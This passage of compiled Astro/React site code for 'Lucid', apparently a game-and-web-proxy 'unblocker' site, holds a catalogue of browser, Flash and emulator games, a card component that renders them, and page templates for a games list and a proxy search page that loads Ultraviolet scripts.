		description: "COLORON is a fun and well-designed platformer. The goal is to match the color of the tower to the bouncing ball. Keep it going for as long as you can, just don't get mad.",
		tags: "",
		route: "colorun",
		source: "/src/colorun/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Drift Hunters",
		description: "Drift Hunters is an awesome 3D car driving game in which you score points by drifting various cars. These points earn you money, that you can spend to upgrade your current car or buy a new one. The game stands out because of its realistic drifting physics and its various driving environments.",
		tags: "",
		route: "drift-hunters",
		source: "/src/drift-hunters/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Economical",
		description: "2D puzzle action game where saving coins is important! Aiming for a goal using items. Make a way with blocks. Break a block with a hammer. But you need coins.",
		tags: "",
		route: "economical",
		source: "/src/economical/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Economical 2",
		description: "Version 2 of the 2D puzzle action game where saving coins is important! Aiming for a goal using items. Make a way with blocks. Break a block with a hammer. But you need coins.",
		tags: "",
		route: "economical-2",
		source: "/src/economical2/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Geometry Dash Remastered",
		description: "Welcome all to Geometry Dash Remastered, and, well, you already know the game. But this is more, this is 5 new levels you can't find anywhere else, this is ... REMASTERED (I'm totally serious).",
		tags: "",
		route: "geometry-dash-remastered",
		source: "/src/geometry-dash-remastered/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Google Snake",
		description: "How long can you last before your tail becomes your dinner? Take the challenge and eat all those apples! Be careful not to hit the wall!",
		tags: "",
		route: "google-snake",
		source: "/src/google-snake",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Hacker Typer",
		description: "Created in 2011, Hacker Typer arose from a simple desire to look like the stereotypical hacker in movies and pop culture. Since that time, it has brought smiles to millions of people across the globe. Plus, many of you have temporarily transformed into hackers yourselves, all from a few clicks on the keyboard (and some programming magic behind the scenes!).",
		tags: "Created in 2011, Hacker Typer arose from a simple desire to look like the stereotypical hacker in movies and pop culture. Since that time, it has brought smiles to millions of people across the globe. Plus, many of you have temporarily transformed into hackers yourselves, all from a few clicks on the keyboard (and some programming magic behind the scenes!).",
		route: "hacker-typer",
		source: "/src/hacker-typer/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Madalin Stunt Cars 2",
		description: "Welcome to the expansive open world of Madalin Stunt Cars 2. Pick your car and drift, drag and race your way through three massive fully explorable maps. Jump behind the wheel of the hottest supercars on the planet, race through cities and execute trick stunts with the sensational Madalin Stunt Cars 2. Pick a Huracan, LaFerrari, Pagani or Veneno and tear up the streets. Compete in multiplayer arenas with other MSC2 gamers.",
		tags: "",
		route: "madalin-stunt-cars-2",
		source: "/src/madalin-stunt-cars-2/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Tactical Assassin 3",
		description: "Tactical Assassin 3 is a sniper game that lets you play as a war sniper, which means you have a hand in the win or loss of your fight. You're given all the tools you'll need to take out the most valuable targets in the field, so make sure to take a deep breath before pulling that trigger.",
		tags: "",
		route: "tactical-assassin-3",
		source: "/swf/tactical-assassin-3.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Ultimate Flash Sonic",
		description: "Ultimate Flash Sonic is a sonic fangame made in Adobe Flash. It was created by Dennis-Gid and it was uploaded to Newgrounds on Febuary 21, 2004.",
		tags: "",
		route: "ultimate-flash-sonic",
		source: "/swf/ultimate-flash-sonic.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Sniper Assassin 4",
		description: "This is a job that requires finesse and nerves of steel. Lives are at stake here, people! Just don't kill the innocent",
		tags: "",
		route: "sniper-assassin-4",
		source: "/swf/sniper-assassin-4.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Tunnel Rush",
		description: "Tunnel Rush Unblocked is the ultimate 3D single-player experience. Blaze your way through caves and tunnels. Each Tunnel Rush level drops you into a whirling kaleidoscope of hazards and 3D tunnels. Play Tunnel Rush to dodge barriers using just your wits and your keyboard. In the game, the ball will keep rolling forward, there will be unknown obstacles in front of us, we need to control the ball to get the tunnel! Just dodge the obstacles by dodging the diamonds in the middle. Now let's take the challenge together! Wanna test your reaction speed? Play Tunnel Rush online now and push your skills to the limit. There's only one way to show those barriers who's boss, so play Tunnel Rush on Poki to show off those ultra-sharp reactions.",
		tags: "",
		route: "tunnel-rush",
		source: "/src/tunnelrush/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Basket Random",
		description: "The random series continues with Basket Random! Basketball is here with its most funny and random way. In Basket Random game, try to score a basket by using only one key with different variations from each other! Changing fields, changing players and changing balls do not surprise you! You can be the best of them all. You can play Basket Random game either against CPU or against a friend in 2 player gaming mode! The one who reaches 5 score first, wins the game. Have Fun!",
		tags: "",
		route: "basket-random",
		source: "/src/basket-random/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Mario Kart 64",
		description: "Mario Kart 64 is a 1996 kart racing video game developed and published by Nintendo for the Nintendo 64. The game is the second entry in the Mario Kart series and is the successor to Super Mario Kart for the Super Nintendo Entertainment System.",
		tags: "",
		route: "mario-cart-64",
		source: "/emulator/n64/mariokart64.z64",
		gameType: "n64",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Pokemon Blue",
		description: "Pokémon Red and Pokémon Blue introduce legions of gamers to the world of Kanto, where the likes of Charmander, Pikachu, and Mewtwo were first discovered. Through exciting exploration, battles, and trades, Trainers are able to access 150 Pokémon. You begin your journey in Pallet Town as a young boy.",
		tags: "",
		route: "pokemon-blue",
		source: "/emulator/gb/pokemon-blue.gb",
		gameType: "gb",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Pokemon Crystal",
		description: "Originally released for the Game Boy™ Color system in 2000, the Pokémon™ Crystal game added several new features to the Pokémon franchise. For the first time, players could choose a female or male character, Pokémon battles featured animation, and more. And now, this Virtual Console release invites you to explore the Johto region again—or for the first time.",
		tags: "",
		route: "pokemon-crystal",
		source: "/emulator/gb/pokemon-crystal.gbc",
		gameType: "gb",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Pokemon Gold",
		description: "Enter a whole new world, with new Pokémon to capture, train and battle! Meet Professor Elm and get the all-new Poké Gear, including map, radio, cell phone and clock. Set the clock then watch as day turns to night and events take place in real time— and be sure to keep an eye out for Pokémon that come out only at night!",
		tags: "",
		route: "pokemon-gold",
		source: "/emulator/gb/pokemon-gold.gbc",
		gameType: "gb",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Pokemon Red",
		description: "Pokémon Red and Pokémon Blue introduce legions of gamers to the world of Kanto, where the likes of Charmander, Pikachu, and Mewtwo were first discovered. Through exciting exploration, battles, and trades, Trainers are able to access 150 Pokémon. You begin your journey in Pallet Town as a young boy.",
		tags: "",
		route: "pokemon-red",
		source: "/emulator/gb/pokemon-red.gb",
		gameType: "gb",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Pokemon Silver",
		description: "Enter a whole new world, with new Pokémon to capture, train and battle! Meet Professor Elm and get the all-new Poké Gear, including map, radio, cell phone and clock. Set the clock then watch as day turns to night and events take place in real time— and be sure to keep an eye out for Pokémon that come out only at night!",
		tags: "",
		route: "pokemon-silver",
		source: "/emulator/gb/pokemon-silver.gbc",
		gameType: "gb",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Pokemon Emerald",
		description: "Pokémon Emerald Version takes Trainers back to the land of Hoenn for an expanded adventure, this time against both Team Magma and Team Aqua! Pokémon Emerald also features an even more exciting storyline featuring the Legendary Rayquaza.",
		tags: "",
		route: "pokemon-emerald",
		source: "/emulator/gba/pokemon-emerald.gba",
		gameType: "gba",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Pokemon Fire Red",
		description: "Pokémon FireRed Version and Pokémon LeafGreen Version are 2004 remakes of the 1996 Game Boy role-playing video games Pokémon Red and Blue.",
		tags: "",
		route: "pokemon-fire-red",
		source: "/emulator/gba/pokemon-firered.gba",
		gameType: "gba",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Pokemon Leaf Green",
		description: "Pokémon FireRed Version and Pokémon LeafGreen Version are 2004 remakes of the 1996 Game Boy role-playing video games Pokémon Red and Blue.",
		tags: "",
		route: "pokemon-leaf-green",
		source: "/emulator/gba/pokemon-leafgreen.gba",
		gameType: "gba",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Pokemon Ruby",
		description: "Immerse yourself in the beautiful region of Hoenn, a place of masterful heroes and mysterious teams, of friendship and battles. As the new kid in town, you set off your journey as a Pokémon Trainer. Who knows what wonders and dangers await you? Now it's time to grab your gear and head out on your own...",
		tags: "",
		route: "pokemon-ruby",
		source: "/emulator/gba/pokemon-ruby.gba",
		gameType: "gba",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Pokemon Sapphire",
		description: "Immerse yourself in the beautiful region of Hoenn, a place of masterful heroes and mysterious teams, of friendship and battles. As the new kid in town, you set off your journey as a Pokémon Trainer. Who knows what wonders and dangers await you? Now it's time to grab your gear and head out on your own...",
		tags: "",
		route: "pokemon-sapphire",
		source: "/emulator/gba/pokemon-sapphire.gba",
		gameType: "gba",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Basketball Stars",
		description: "Basketball Stars is a 2-player basketball game created by Madpuffers. You can play solo or with a friend as a variety of legendary basketball players. Shoot basketball with the likes of LeBron James, James Harden, and Stephen Curry in Basketball Stars!",
		tags: "",
		route: "basketball-stars",
		source: "/src/basketball-stars/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Minesweeper",
		description: "Minesweeper is a single-player puzzle video game. The objective of the game is to clear a rectangular board containing hidden 'mines' or bombs without detonating any of them, with help from clues about the number of neighboring mines in each field.",
		tags: "",
		route: "minesweeper",
		source: "/src/minesweeper/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Sans Fight",
		description: "Undertale Sans Fight Clone; 'do you wanna have a bad time? 'cause if you visit this page... you are REALLY not going to like what happens next.'",
		tags: "",
		route: "sans-fight",
		source: "/src/sans-fight/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "There is no Game",
		description: "There is no game. There is nothing to do. Do not click or tap anywhere. Really. DO NOT CLICK OR TAP ANYWHERE. Do not laugh as there is nothing to laugh about.",
		tags: "",
		route: "there-is-no-game",
		source: "/src/there-is-no-game/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Unfair Dyne",
		description: "Break the word in half and add 'UN' to each part. Undyne fight, but harder.",
		tags: "",
		route: "unfair-dyne",
		source: "/src/unfair-dyne/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Volley Gosh",
		description: "Volley Gosh is a bright and happy ball game where you must try keep your 'volley gosh ball' in the air for as long as possible. Watch out for the increasing challenge and surprises that abound on the joyful beach while you get your next high score!",
		tags: "",
		route: "volley-gosh",
		source: "/src/volleygosh/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "NBA Jam",
		description: "NBA Jam is a classic arcade basketball game developed and published back in 1993 and is the first entry to the NBA Jam series. The game features 2 on 2 basketball match off and is one of the first sports games to feature real and digitized NBA-licensed teams and players!",
		tags: "",
		route: "nb-jam",
		source: "/emulator/snes/nbajam.sfc",
		gameType: "snes",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "NBA Jam Tournament Edition",
		description: "NBA Jam Tournament Edition is the second game in the basketball arcade series created by Midway. The game features two-on-two fast paced matches with real life NBA players from the 1993-1994 seasons. The game has over 120 NBA athletes plus more than 40 hidden characters to unlock.",
		tags: "",
		route: "nba-jam-tournament-edition",
		source: "/emulator/snes/nbajamtournamentedition.smc",
		gameType: "snes",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "NBA Jam 2K20",
		description: "NBA Jam 2K20: Tournament Edition is a ROM hack of the game NBA Jam: Tournament Edition for the Super Nintendo Entertainment System (SNES). This hack did not change the core aspects, as well as most game mechanics, of the game, and instead worked on updating its player and team roster to match the 2019-2020 NBA season.",
		tags: "",
		route: "nba-jam-2k20",
		source: "/emulator/snes/nbajam2k20.smc",
		gameType: "snes",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Donkey Kong Country",
		description: "Donkey Kong Country is a side-scrolling platform game in which the player must complete 40 levels to recover the Kongs' banana hoard, which has been stolen by the crocodilian Kremlings.",
		tags: "",
		route: "donkey-kong-country",
		source: "/emulator/snes/dkc.sfc",
		gameType: "snes",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Super Mario Allstars + Super Mario World",
		description: "Super Mario All-Stars + Super Mario World is a compilation title for the Super Nintendo Entertainment System. It includes all the games from Super Mario All-Stars, as well as Super Mario World. It was released in December 1994 in North America, 1995 in Europe, and was never released in Japan.",
		tags: "",
		route: "super-mario-allstars--super-mario-world",
		source: "/emulator/snes/smasmw.smc",
		gameType: "snes",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Street Fighter 2",
		description: "Street Fighter II: The World Warrior is a competitive fighting game originally released for the arcades in 1991. It is the second entry in the Street Fighter series and the arcade sequel to the original Street Fighter released in 1987. It was Capcom's fourteenth title that ran on the CP System arcade hardware. Street Fighter II improved upon the many concepts introduced in the first game, including the use of command-based special moves and a six-button configuration, while offering players a selection of multiple playable characters, each with their own unique fighting style.",
		tags: "",
		route: "street-fighter-2",
		source: "/emulator/snes/sf2.sfc",
		gameType: "snes",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Sonic 1",
		description: "Sonic the Hedgehog is a Japanese video game series and media franchise created and owned by Sega. The franchise follows Sonic, an anthropomorphic blue hedgehog who battles the evil Doctor Eggman, a mad scientist.",
		tags: "",
		route: "sonic-1",
		source: "/emulator/segaMD/sonic1.smd",
		gameType: "segaMD",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Sonic 2",
		description: "Sonic the Hedgehog 2 is a 1992 platform game developed and published by Sega for the Sega Genesis. It follows Sonic as he attempts to stop Doctor Robotnik from stealing the Chaos Emeralds to power his space station, the Death Egg.",
		tags: "",
		route: "sonic-2",
		source: "/emulator/segaMD/sonic2.smd",
		gameType: "segaMD",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Sonic 3 & Knuckles",
		description: "Dr. Eggman's (AKA Dr. Robotnik's) Death Egg was once again blasted by Sonic, crash-landing on the peak of a volcano on the Floating Island. Dr. Eggman is still at large, and Sonic can't allow him to get his hands on the Master Emerald and repair the Death Egg.",
		tags: "",
		route: "sonic-3--knuckles",
		source: "/emulator/segaMD/sonic3knuckles.smd",
		gameType: "segaMD",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Meat Boy",
		description: "This is NOT Super Meat Boy! Its simply the flash prototype that Super Meat Boy was based off of. SMB, will play very differently and is 100% new.. what im saying is if you even slightly enjoy the prototype, you will LOVE SMB! For more info on Super Meat Boy check out supermeatboy.com",
		tags: "",
		route: "meat-boy",
		source: "/swf/meat-boy.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Shift",
		description: "Is the floor the roof? Is the roof the floor? And whats with that in game timer? Find the answers to all the above questions and more in this original puzzle platformer!",
		tags: "",
		route: "shift",
		source: "/swf/shift.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Shift 2",
		description: "The sequel to The Shift! Is the floor the roof? Is the roof the floor? And whats with that in game timer? Find the answers to all the above questions and more in this original puzzle platformer, part 2!",
		tags: "",
		route: "shift-2",
		source: "/swf/shift-2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Unfair Mario",
		description: "It is Super Mario, again. Our beloved little fellow is inviting you to travel alongside him throughout the Unfair Mario game. You will find yourself in the classic arcade game, but this time, with a little twist. Some traps will be trickier, and some obstacles harder to overcome. But you will survive it, will you not?",
		tags: "",
		route: "unfair-mario",
		source: "/swf/unfairmario.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Soccer Random",
		description: "Soccer Random is one of the most fun sports games. The game's objective is to score a goal using only one key with different variations!",
		tags: "",
		route: "soccer-random",
		source: "/src/soccer-random/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Volley Random",
		description: "The fun random game series continues with Volley Random. There is a Volleyball experience unlike any before. With fun ragdoll physics and a variety of variations, each match will be different. The playing court, ball and players may change. The important thing is to be able to get score under all conditions. ",
		tags: "",
		route: "volley-random",
		source: "/src/volley-random/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Boxing Random",
		description: "The new version of the random game series that you love to play continues with Boxing Random. Again, changing conditions occur in every round. Sometimes the boxing field changes and sometimes the boxers. Adapt to every random feature and hit accurately. When you get the rocket punch, balance and send it to the opponent's head. This way you can knock out the opponent without getting close! The one who reaches 5 score first, wins the game!",
		tags: "",
		route: "boxing-random",
		source: "/src/boxing-random/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Madness Accelerant",
		description: "Madness Accelerant is a fast-paced action game to beat the enemies and escape the beast monster. This game is a playable remake of Krinkel's Madness Consternation.",
		tags: "",
		route: "madness-accelerant",
		source: "/swf/madness-accelerant.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Mind Games for 2 Player",
		description: "We collected some brain and board games that you can play as two player in a single game. We are presenting you eight brain / table game which are played by everyone fondly. You can play Chess, Tic Tac Toe, Checkers, Ludo, Connect 4, Snake and Ladders, Mancala and Math games in game box for free! If you cannot decide on which game you want to play, you can give a chance to spin the “Spin” to let it pick a game for you.",
		tags: "",
		route: "mind-games-for-2-player",
		source: "/src/mind-games-for-2-player/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Uno",
		description: "The classic popular game UNO can be played online in the browser. You can play the game locally or online multiplayer. You can enter the lobbies in the online section. Face up to 3 CPU-controlled opponents. Match cards by color or number, play action cards to mix the game up and be the first to get rid of all cards. Also, do not forget to press the 1 button when you have only one card left!",
		tags: "",
		route: "uno",
		source: "/src/uno/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Flakboy",
		description: "Wanna try out some awesome new weapons? Of course you do. Get blastin'!",
		tags: "",
		route: "flakboy",
		source: "/src/flakboy/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Krunker.io",
		description: "Krunker.io is a free Multiplayer Online Game. No Download needed",
		tags: "",
		route: "krunker-io",
		source: "https://krunker.io/",
		gameType: "proxy",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Shell Shockers",
		description: "Alt URL: geometry.best. Shell Shockers, the world's most advanced egg-based multiplayer shooter! It's like your favorite battlefield game but... with eggs.",
		tags: "",
		route: "shell-shockers",
		source: "https://shellshock.io/",
		gameType: "proxy",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "1v1.lol",
		description: "Discover 1v1, the online building simulator & third person shooting game. Battle royale, build fight, box fight, zone wars and more game modes to enjoy!",
		tags: "",
		route: "1v1-lol",
		source: "https://1v1.lol/",
		gameType: "proxy",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Dogeminer",
		description: "Dogeminer is an adventure, a journey, a mission, a rivalry and so much more. The best thing? It's playable right here for free! Hit START now to begin your adventure!",
		tags: "",
		route: "dogeminer",
		source: "https://dogeminer2.com/",
		gameType: "proxy",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Territorial.io",
		description: "Territorial.io - The Art of Conquest",
		tags: "",
		route: "territorial-io",
		source: "https://territorial.io/",
		gameType: "proxy",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "MooMoo.io",
		description: "MooMoo.io is a brand new Survival IO Game. Build and Survive with your friends",
		tags: "",
		route: "moomoo-io",
		source: "https://moomoo.io/",
		gameType: "proxy",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Voxiom.io",
		description: "Play the best browser multiplayer voxel first person shooter inspired by minecraft, fortnite, counter-strike, and call of duty!",
		tags: "",
		route: "voxiom-io",
		source: "https://voxiom.io/",
		gameType: "proxy",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Deeeep.io",
		description: "Deeeep.io is a multiplayer online browser game that takes place in the depths of the ocean. Eat food and other players, hide in underwater terrain and evolve your animals to earn points and reach the top of the food chain.",
		tags: "",
		route: "deeeep-io",
		source: "https://deeeep.io/",
		gameType: "proxy",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Agma.io",
		description: "Play Agma - An MMO game combining strategy to survive and eat other players in order to become the largest and strongest player, with a ton of new features such as powerups and shop. Chat and play against friends, find your team and destroy lobbies with your clan. Freeze and teleport other players to make them weak. Fight, and survive as many battles as you can in order to sustain your rank. Gain exp and level up. Mobile friendly",
		tags: "",
		route: "agma-io",
		source: "https://agma.io/",
		gameType: "proxy",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Warbrokers.io",
		description: "War Brokers is a browser-based first-person shooter with a wide variety of game modes, weaponry, maps, and skins. War Brokers is available to play for free online at Warbrokers.io and can also be purchased on Steam too. Currently, the game has four game modes: Battle Royale, Classic (8v8), 4v4 (Speed), and Survival.",
		tags: "",
		route: "warbrokers-io",
		source: "https://warbrokers.io/",
		gameType: "proxy",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Gun Knight",
		description: "A roguelike heavily inspired by Gungeon and Binding of Isaac, you play a Knight whose quest is to venture into a nearby dungeon.",
		tags: "",
		route: "gun-knight",
		source: "/src/gun-knight/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Ludo Online",
		description: "Ludo King is an Indian free-to-play mobile game application developed by Indian studio Gametion Technologies Pvt Ltd, based in Mumbai, India. Gametion is owned by Vikash Jaiswal. It is developed on the Unity game engine and is available on Android, iOS, Kindle, Windows Phone and Microsoft Windows platforms.",
		tags: "",
		route: "ludo-online",
		source: "/src/ludo-online/index.html",
		gameType: "html",
		width: "1000px",
		height: "625px",
		listed: true
	}
];

function GameCard() {
  return /* @__PURE__ */ jsx("div", {
    className: "gamesDiv bg-base-200",
    children: /* @__PURE__ */ jsx("div", {
      className: "gamesDiv1 flex flex-row flex-wrap pt-3 py-3",
      children: Data.map((game) => {
        if (game.hasOwnProperty("image") === false) {
          return /* @__PURE__ */ jsxs(Fragment$1, {
            children: [/* @__PURE__ */ jsx("div", {}, game.title), /* @__PURE__ */ jsxs("div", {
              className: "card w-96 bg-base-100 shadow-xl",
              children: [/* @__PURE__ */ jsx("figure", {
                children: /* @__PURE__ */ jsx("img", {
                  src: "/images/noimage.png",
                  alt: game.title,
                  width: "350",
                  height: "350"
                })
              }), /* @__PURE__ */ jsxs("div", {
                className: "card-body",
                children: [/* @__PURE__ */ jsx("h2", {
                  className: "card-title",
                  children: game.title
                }), /* @__PURE__ */ jsx("p", {
                  children: game.description
                }), /* @__PURE__ */ jsx("div", {
                  className: "card-actions justify-end",
                  children: /* @__PURE__ */ jsx("a", {
                    className: "btn btn-primary",
                    href: game.source,
                    children: "Launch"
                  })
                })]
              })]
            })]
          });
        } else {
          if (game.source.includes("swf") === false) {
            return /* @__PURE__ */ jsxs(Fragment$1, {
              children: [/* @__PURE__ */ jsx("div", {}, game.title), /* @__PURE__ */ jsxs("div", {
                className: "card w-96 bg-base-100 shadow-xl",
                children: [/* @__PURE__ */ jsx("figure", {
                  children: /* @__PURE__ */ jsx("img", {
                    src: game.image,
                    alt: game.title,
                    width: "350",
                    height: "350"
                  })
                }), /* @__PURE__ */ jsxs("div", {
                  className: "card-body",
                  children: [/* @__PURE__ */ jsx("h2", {
                    className: "card-title",
                    children: game.title
                  }), /* @__PURE__ */ jsx("p", {
                    children: game.description
                  }), /* @__PURE__ */ jsx("div", {
                    className: "card-actions justify-end",
                    children: /* @__PURE__ */ jsx("a", {
                      className: "btn btn-primary",
                      href: game.source,
                      children: "Launch"
                    })
                  })]
                })]
              })]
            });
          } else {
            return /* @__PURE__ */ jsxs(Fragment$1, {
              children: [/* @__PURE__ */ jsx("div", {}, game.title), /* @__PURE__ */ jsxs("div", {
                className: "card w-96 bg-base-100 shadow-xl",
                children: [/* @__PURE__ */ jsx("figure", {
                  children: /* @__PURE__ */ jsx("img", {
                    src: game.image,
                    alt: game.title,
                    width: "350",
                    height: "350"
                  })
                }), /* @__PURE__ */ jsxs("div", {
                  className: "card-body",
                  children: [/* @__PURE__ */ jsx("h2", {
                    className: "card-title",
                    children: game.title
                  }), /* @__PURE__ */ jsx("p", {
                    children: game.description
                  }), /* @__PURE__ */ jsx("div", {
                    className: "card-actions justify-end",
                    children: /* @__PURE__ */ jsx("a", {
                      className: "btn btn-primary",
                      href: "/ruffleloader?url=" + game.source,
                      children: "Launch"
                    })
                  })]
                })]
              })]
            });
          }
        }
      })
    })
  });
}
__astro_tag_component__(GameCard, "@astrojs/react");

const $$Astro$1 = createAstro("D:/Lucid-New/src/pages/games.astro", "", "file:///D:/Lucid-New/");
const $$Games = createComponent(async ($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro$1, $$props, $$slots);
  Astro2.self = $$Games;
  return renderTemplate`<html lang="en" id="wrap">
	<head>
		<meta charset="utf-8">
		<link rel="icon" type="image/svg+xml" href="/favicon.svg">
		<meta name="viewport" content="width=device-width">
		<meta name="generator"${addAttribute(Astro2.generator, "content")}>
		<meta property="og:title" content="Lucid">
		<meta property="og:site_name" content="Lucid">
		<meta name="keywords" content="unblocker, games, proxy, vpn, nova, lucid unblocker, lucid">
		<meta name="description" content="Lucid is an internet utility that provides more functionality for users. A Nova Service. ">
		<title>Lucid</title>
	${renderHead($$result)}</head>
	<body>
		${maybeRenderHead($$result)}
		${renderComponent($$result, "Navbar", Navbar, {})}
		${renderComponent($$result, "GameCard", GameCard, {})}
	</body></html>`;
}, "D:/Lucid-New/src/pages/games.astro");

const $$file$1 = "D:/Lucid-New/src/pages/games.astro";
const $$url$1 = "/games";

const _page6 = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  default: $$Games,
  file: $$file$1,
  url: $$url$1
}, Symbol.toStringTag, { value: 'Module' }));

function SearchHero() {
  return /* @__PURE__ */ jsx(Fragment$1, {
    children: /* @__PURE__ */ jsx("div", {
      className: "hero min-h-screen bg-base-200",
      children: /* @__PURE__ */ jsx("div", {
        className: "hero-content text-center",
        children: /* @__PURE__ */ jsxs("div", {
          className: "max-w-md",
          children: [/* @__PURE__ */ jsx("h1", {
            className: "text-5xl font-bold",
            children: "Search"
          }), /* @__PURE__ */ jsx("p", {
            className: "py-6",
            children: "Enter your query in the box below."
          }), /* @__PURE__ */ jsxs("div", {
            className: "inputArea space-x-2 text-center",
            children: [/* @__PURE__ */ jsx("input", {
              type: "text",
              id: "searchBox",
              placeholder: "Search or Enter URL",
              className: "input input-bordered w-96 max-w-xs"
            }), /* @__PURE__ */ jsx("button", {
              className: "btn btn-active btn-ghost w-20",
              id: "searchButton",
              children: "Go"
            })]
          })]
        })
      })
    })
  });
}
__astro_tag_component__(SearchHero, "@astrojs/react");

var __freeze = Object.freeze;
var __defProp = Object.defineProperty;
var __template = (cooked, raw) => __freeze(__defProp(cooked, "raw", { value: __freeze(raw || cooked.slice()) }));
var _a;
const $$Astro = createAstro("D:/Lucid-New/src/pages/proxy.astro", "", "file:///D:/Lucid-New/");
const $$Proxy = createComponent(async ($$result, $$props, $$slots) => {
  const Astro2 = $$result.createAstro($$Astro, $$props, $$slots);
  Astro2.self = $$Proxy;
  return renderTemplate(_a || (_a = __template(['<html lang="en" id="wrap">\n	<head>\n		<meta charset="utf-8">\n		<link rel="icon" type="image/svg+xml" href="/favicon.svg">\n		<meta name="viewport" content="width=device-width">\n		<meta name="generator"', '>\n		<meta property="og:title" content="Lucid">\n		<meta property="og:site_name" content="Lucid">\n		<meta name="keywords" content="unblocker, games, proxy, vpn, nova, lucid unblocker, lucid">\n		<meta name="description" content="Lucid is an internet utility that provides more functionality for users. A Nova Service. ">\n		<title>Lucid</title>\n	', "</head>\n	<body>\n		\n		", "\n		", "\n		", '\n\n		<script src="/uv/uv.bundle.js"><\/script>\n		<script src="/uv/uv.config.js"><\/script>\n		<script src="/dip/dip.config.js"><\/script>\n		<script src="/dip/dip.page.js"><\/script>\n\n	</body>\n</html>'])), addAttribute(Astro2.generator, "content"), renderHead($$result), renderComponent($$result, "Navbar", Navbar, {}), renderComponent($$result, "Hero", SearchHero, {}), maybeRenderHead($$result));
}, "D:/Lucid-New/src/pages/proxy.astro");

const $$file = "D:/Lucid-New/src/pages/proxy.astro";
const $$url = "/proxy";

const _page7 = /*#__PURE__*/Object.freeze(/*#__PURE__*/Object.defineProperty({
  __proto__: null,
  default: $$Proxy,
  file: $$file,
  url: $$url
}, Symbol.toStringTag, { value: 'Module' }));

